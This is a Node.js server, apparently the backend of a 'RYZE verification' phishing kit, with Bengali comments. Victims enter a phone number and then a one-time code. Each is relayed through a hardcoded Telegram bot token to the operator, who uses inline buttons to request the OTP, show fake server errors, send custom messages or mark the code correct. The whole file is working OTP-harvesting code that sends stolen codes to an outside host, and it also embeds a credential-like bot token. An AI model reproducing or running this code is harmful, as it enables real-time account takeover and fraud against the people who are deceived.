const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { Telegraf, Markup } = require('telegraf');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const BOT_TOKEN = '8599585292:AAENAD4zbqo8bJL3XPzhcyAwdkR3buB_3gM';
const MY_CHAT_ID = '5967798239';
const LOGO_URL = 'https://i.ibb.co.com/ZpsnDh48/RYZE.png';
const bot = new Telegraf(BOT_TOKEN);

// Render URL (আপনার আসল URL এখানে দিন)
const WEBHOOK_URL = 'https://ryze-verification.onrender.com';

app.use(express.static('public'));

// টেলিগ্রাম ওয়েবহুক সেটআপ (এটি পোলিং কনফ্লিক্ট বন্ধ করবে)
app.use(bot.webhookCallback(`/bot${BOT_TOKEN}`));
bot.telegram.setWebhook(`${WEBHOOK_URL}/bot${BOT_TOKEN}`);

app.get('/ping', (req, res) => res.send('RYZE Server is Awake!'));

const activeUsers = {};
let lastAdminAction = {};

io.on('connection', (socket) => {
    socket.on('send_phone', async (data) => {
        const { phone, purpose } = data;
        activeUsers[socket.id] = { phone, purpose, socketId: socket.id };

        const msg = await bot.telegram.sendMessage(MY_CHAT_ID, 
            `👤 <b>নতুন ইউজার রিকোয়েস্ট</b>\n\n` +
            `📱 নম্বর: <code>${phone}</code>\n` +
            `🎯 উদ্দেশ্য: <b>${purpose}</b>\n` +
            `⏳ স্ট্যাটাস: <i>অপেক্ষমান...</i>`, 
            {
                parse_mode: 'HTML',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🔢 OTP বক্স পাঠাও', `ask_otp_${socket.id}`)],
                    [Markup.button.callback('⚠️ Server Error', `srv_err_${socket.id}`)],
                    [Markup.button.callback('💬 কাস্টম মেসেজ', `cust_msg_${socket.id}`)],
                    [Markup.button.callback('❌ রিজেক্ট', `retry_phone_${socket.id}`)]
                ])
            }
        );
        activeUsers[socket.id].telegramMsgId = msg.message_id;
    });

    socket.on('send_otp', (otp) => {
        const user = activeUsers[socket.id];
        if (!user) return;

        bot.telegram.editMessageText(MY_CHAT_ID, user.telegramMsgId, null,
            `📩 <b>OTP ভেরিফিকেশন</b>\n\n` +
            `📱 নম্বর: <code>${user.phone}</code>\n` +
            `🎯 উদ্দেশ্য: <b>${user.purpose}</b>\n` +
            `🔢 প্রাপ্ত OTP: <code>${otp}</code>\n\n` +
            `মেলাতে সুবিধা হলে নিচের একশন নিন:`,
            {
                parse_mode: 'HTML',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('✅ সঠিক (Success)', `verify_success_${socket.id}`)],
                    [Markup.button.callback('❌ ভুল OTP (Retry)', `verify_fail_${socket.id}`)],
                    [Markup.button.callback('💬 কাস্টম মেসেজ', `cust_msg_${socket.id}`)]
                ])
            }
        );
    });
});

// --- টেলিগ্রাম বাটন হ্যান্ডলার ---
bot.action(/ask_otp_(.+)/, (ctx) => {
    const socketId = ctx.match[1];
    io.to(socketId).emit('show_otp_input');
    const user = activeUsers[socketId];
    if(user) {
        ctx.editMessageText(`👤 <b>ইউজার সেশন</b>\n\n📱 নম্বর: <code>${user.phone}</code>\n🎯 উদ্দেশ্য: <b>${user.purpose}</b>\n⏳ স্ট্যাটাস: <i>ইউজারকে OTP বক্স পাঠানো হয়েছে...</i>`, { parse_mode: 'HTML' });
    }
});

bot.action(/srv_err_(.+)/, (ctx) => {
    const socketId = ctx.match[1];
    const user = activeUsers[socketId];
    io.to(socketId).emit('custom_msg', { title: "Server Error", icon: LOGO_URL, msg: "Internal server error occurred. Please try again after some time." });
    ctx.editMessageText(`⚠️ <b>সার্ভার এরর পাঠানো হয়েছে</b>\n📱 নম্বর: <code>${user?.phone}</code>`, { parse_mode: 'HTML' });
});

bot.action(/cust_msg_(.+)/, (ctx) => {
    const socketId = ctx.match[1];
    lastAdminAction[ctx.chat.id] = { socketId, action: 'waiting_for_text' };
    ctx.reply("💬 এই ইউজারের জন্য আপনার মেসেজটি লিখুন:");
});

bot.on('text', (ctx) => {
    const adminData = lastAdminAction[ctx.chat.id];
    if (adminData && adminData.action === 'waiting_for_text') {
        const socketId = adminData.socketId;
        const messageText = ctx.message.text;
        io.to(socketId).emit('custom_msg', { title: "Admin Message", icon: LOGO_URL, msg: messageText });
        ctx.reply(`✅ মেসেজটি পাঠানো হয়েছে।`);
        delete lastAdminAction[ctx.chat.id];
    }
});

bot.action(/verify_success_(.+)/, (ctx) => {
    const socketId = ctx.match[1];
    const user = activeUsers[socketId];
    io.to(socketId).emit('final_status', { status: 'success' });
    ctx.editMessageText(`✅ <b>ভেরিফাইড সফল!</b>\n📱 নম্বর: <code>${user?.phone}</code>\n🎯 উদ্দেশ্য: ${user?.purpose}`, { parse_mode: 'HTML' });
});

bot.action(/verify_fail_(.+)/, (ctx) => {
    const socketId = ctx.match[1];
    const user = activeUsers[socketId];
    io.to(socketId).emit('final_status', { status: 'fail' });
    ctx.editMessageText(`❌ <b>ভুল OTP জানানো হয়েছে</b>\n📱 নম্বর: <code>${user?.phone}</code>`, { parse_mode: 'HTML' });
});

bot.action(/retry_phone_(.+)/, (ctx) => {
    const socketId = ctx.match[1];
    const user = activeUsers[socketId];
    io.to(socketId).emit('retry_phone');
    ctx.editMessageText(`🚫 <b>রিকোয়েস্ট রিজেক্টেড</b>\n📱 নম্বর: <code>${user?.phone}</code>`, { parse_mode: 'HTML' });
});

// Render-এ বট লঞ্চ করার জন্য আর bot.launch() দরকার নেই ওয়েবহুকের ক্ষেত্রে
// শুধু এরর হ্যান্ডেল করার জন্য রাখা যেতে পারে
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));

server.listen(process.env.PORT || 3000, () => {
    console.log('RYZE Server Running on Port 3000 with Webhook support');
});
